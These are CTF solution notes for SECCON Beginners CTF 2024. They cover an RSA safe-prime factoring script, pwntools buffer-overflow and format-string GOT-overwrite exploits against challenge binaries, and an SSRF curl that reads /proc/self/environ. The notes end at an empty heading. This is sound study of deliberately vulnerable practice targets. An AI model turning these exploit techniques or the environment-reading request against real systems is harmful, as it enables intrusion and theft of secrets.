# SECCON Beginners CTF 2024

- https://github.com/SECCON/SECCON_Beginners_CTF_2024

## crypto

### Safe Prime

- https://www.youtube.com/watch?v=DPYlSEbIGsY&t=5m40s

#### Solution 1

```python
#!/usr/bin/env python3
from Crypto.Util.number import long_to_bytes
from sympy import symbols, Eq, solve
n = 292927367433510948901751902057717800692038691293351366163009654796102787183601223853665784238601655926920628800436003079044921928983307813012149143680956641439800408783429996002829316421340550469318295239640149707659994033143360850517185860496309968947622345912323183329662031340775767654881876683235701491291
c = 40791470236110804733312817275921324892019927976655404478966109115157033048751614414177683787333122984170869148886461684367352872341935843163852393126653174874958667177632653833127408726094823976937236033974500273341920433616691535827765625224845089258529412235827313525710616060854484132337663369013424587861
e = 65537
# q = 2 * p + 1
# n = p * q
# c = pow(m, e, n)
p = symbols('p')
eq = Eq(n, p*(2*p + 1))
solutions = solve(eq, p)
print(f'{solutions=}')
p = int(max(solutions))
q = 2*p + 1
phi = (p - 1) * (q - 1)
d = pow(e, -1, phi)
m = pow(c, d, n)
print(long_to_bytes(m).decode())
```

## pwnable

### simpleoverflow

- https://www.youtube.com/watch?v=DPYlSEbIGsY&t=2m30s

#### Solution 1

```zsh
python3 -c "print('A'*10)"|./chall
```

#### Solution 2

```python
#!/usr/bin/env python3
from pwn import ELF, context, p64, process, remote
context.log_level = 'debug'
exe = context.binary = ELF('./chall')
# io = exe.process([exe.path])
io = remote('::1', 9000)
io.sendlineafter(b'name:', b'A'*0xe + b'B'*0x8 + p64(0x4011ef))
io.interactive()
```

### simpleoverwrite

- https://www.youtube.com/watch?v=DPYlSEbIGsY&t=17m30s

#### Solution 1

```python
#!/usr/bin/env python3
from pwn import ELF, context, p64, process
# context.log_level = 'debug'
exe = context.binary = ELF('./chall')
io = process([exe.path])
io.sendlineafter(b'input:', b'A'*0xa + b'B'*8 + p64(exe.sym.win))
io.interactive()
```

### pure-and-easy

- https://qiita.com/mae_t/items/91a82f8efe361305c29b
- https://www.youtube.com/watch?v=DPYlSEbIGsY&t=63m31s

#### Solution 1

```python
#!/usr/bin/env python3
from pwn import ELF, FmtStr, context, fmtstr_payload, gdb, log, process, remote
# context.log_level = 'debug'
exe = context.binary = ELF('./chall')
# io = process([exe.path])
# io = gdb.debug([exe.path], gdbscript='b main \n c')
io = remote('::1', 9000)


def exec_fmt(payload):
    p = process([exe.path])
    p.sendline(payload)
    return p.readline()


autofmt = FmtStr(exec_fmt)
offset = autofmt.offset
payload = fmtstr_payload(
        offset, {exe.got.exit: exe.sym.win})
log.info('payload: %s', (repr(payload)))
io.sendlineafter(b'>', payload)
io.stream()
```

## web

### ssrforlfi

- https://www.youtube.com/watch?v=DPYlSEbIGsY&t=71m40s

#### Solution 1

```zsh
curl -k 'https://127.0.0.1/?url=file://localhost/proc/self/environ' -o -
```

### wooorker
